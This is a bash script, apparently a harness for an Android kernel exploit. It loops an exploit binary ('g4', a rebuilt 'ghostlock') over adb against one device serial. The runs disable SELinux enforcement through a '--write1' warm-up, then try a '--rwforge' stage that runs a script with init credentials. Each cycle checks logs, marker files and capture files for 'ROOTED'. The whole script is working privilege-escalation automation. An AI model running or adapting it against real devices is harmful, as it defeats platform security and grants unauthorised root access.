#!/bin/bash
# rr_loop4.sh — wq-umh grind: warm boot via --write1, then channel + wq-umh.
# Binary: /data/local/tmp/a/g4 (rebuilt ghostlock with oracle slide + wq-umh).
# Success signals: "ROOTED" in log, /data/local/tmp/a/.umh_rooted, or
# /data/local/tmp/cap/ contents (umh.sh ran with init creds).
SERIAL=RZGL4256DVE
LOG="$(cd "$(dirname "$0")" && pwd)/rr_loop_czg1.log"
BIN=/data/local/tmp/a/g4

say() { echo "[$(date '+%H:%M:%S')] $*" | tee -a "$LOG"; }

wait_device() {
  while ! adb -s "$SERIAL" shell 'true' </dev/null 2>/dev/null; do sleep 10; done
  adb -s "$SERIAL" shell 'svc power stayon true' </dev/null 2>/dev/null
}

dev() { adb -s "$SERIAL" shell "$1" </dev/null 2>/dev/null; }

run_with_timeout() { # $1=timeout s, $2=remote cmd
  adb -s "$SERIAL" shell "$2" </dev/null >/dev/null 2>&1 &
  local apid=$!
  ( sleep "$1"; kill "$apid" 2>/dev/null ) & local wpid=$!
  wait "$apid"; local rc=$?
  kill "$wpid" 2>/dev/null; wait "$wpid" 2>/dev/null
  return $rc
}

n=0
LOOP_START=$(date +%s)
# stale-marker guard: a leftover .umh_rooted survives reboots and twice
# false-positived "ROOTED (umh marker)" when cycles died at channel install
# before g4's unlink-at-arm. Clear it once (a/ is 777, shell can rm), and
# require cap/id.txt to be FRESH (mtime >= loop start).
dev 'rm -f /data/local/tmp/a/.umh_rooted' 
while true; do
  n=$((n+1))
  wait_device
  # 1. warm-up: SELinux off?
  for w in 1 2; do
    en=$(dev 'cat /sys/fs/selinux/enforce 2>/dev/null' | tr -d '\r\n')
    [ "$en" = "0" ] && break
    say "cycle $n: warming boot (W1 probe run $w)"
    run_with_timeout 1200 "$BIN --write1 > /data/local/tmp/a/g4w1.log 2>&1; sync"
    wait_device
  done
  en=$(dev 'cat /sys/fs/selinux/enforce 2>/dev/null' | tr -d '\r\n')
  if [ "$en" != "0" ]; then say "cycle $n: boot still enforcing after probes — rerolling"; continue; fi

  # 2. channel + wq-umh
  say "cycle $n: wq-umh run"
  run_with_timeout 1800 "GL_WQ_UMH=1 GL_RWF_SLOTS=64 RWF_DEBUG=1 $BIN --rwforge > /data/local/tmp/a/g4umh.log 2>&1; sync"
  wait_device
  out=$(dev 'cat /data/local/tmp/a/g4umh.log 2>/dev/null')
  echo "=== cycle $n wq-umh ===" >> "$LOG"
  echo "$out" | LC_ALL=C grep -aE 'umh|wq-|oracle slide|rwforge|ROOTED|fuse|slide' | tail -25 >> "$LOG"
  if echo "$out" | LC_ALL=C grep -qa 'ROOTED'; then say "ROOTED on cycle $n"; exit 0; fi
  if dev 'ls /data/local/tmp/a/.umh_rooted' | grep -q umh_rooted; then say "ROOTED (umh marker) on cycle $n"; exit 0; fi
  id_mtime=$(dev 'stat -c %Y /data/local/tmp/cap/id.txt 2>/dev/null' | tr -d '\r\n')
  if [ -n "$id_mtime" ] && [ "$id_mtime" -ge "$LOOP_START" ] 2>/dev/null; then say "ROOTED (fresh captures) on cycle $n"; exit 0; fi
  say "cycle $n: wq-umh done, no root yet"
done
